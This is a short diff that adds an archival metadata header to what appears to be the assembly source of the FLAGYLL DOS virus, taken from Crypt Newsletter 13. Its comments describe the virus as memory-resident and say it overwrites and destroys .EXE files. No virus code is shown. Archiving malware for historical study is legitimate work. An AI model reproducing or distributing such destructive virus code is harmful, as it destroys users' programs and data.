@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      F
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ;FLAGYLL virus - edited for Crypt Newsletter 13               
 ;FLAGYLL is a memory resident, overwriting virus which
 ;infects and destroys .EXE files on load.
